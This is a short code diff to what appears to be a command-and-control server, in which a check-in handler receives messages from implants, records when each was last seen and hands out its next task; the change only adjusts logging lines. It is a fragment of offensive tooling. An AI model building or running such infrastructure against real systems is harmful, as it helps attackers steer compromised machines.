@@ -41,14 +41,14 @@ def checkin():
     reg_data = request.get_data()
     ic = ImplantCheckin()
     ic.ParseFromString(reg_data)
-    print(f'[+] Implant is checking in.')
+    print(f'[+] Implant [{ic.ImplantID}] is checking in.')
     print(f'[+] --> TaskResponse = [{ic.Resp}]')
 
-    print(f'updating time implant last seen')
+    # print(f'updating time implant last seen')
     update_implant_last_seen(ic.ImplantID)
-    print(f'analyzing task response') 
+    # print(f'analyzing task response') 
     analyze_TaskResponse(ic.Resp)
-    print(f'Getting next task')
+    # print(f'Getting next task')
     # Send TaskRequest back or "" (if failed to analyze or no remaining tasks)
     return get_next_task(ic.ImplantID)
 
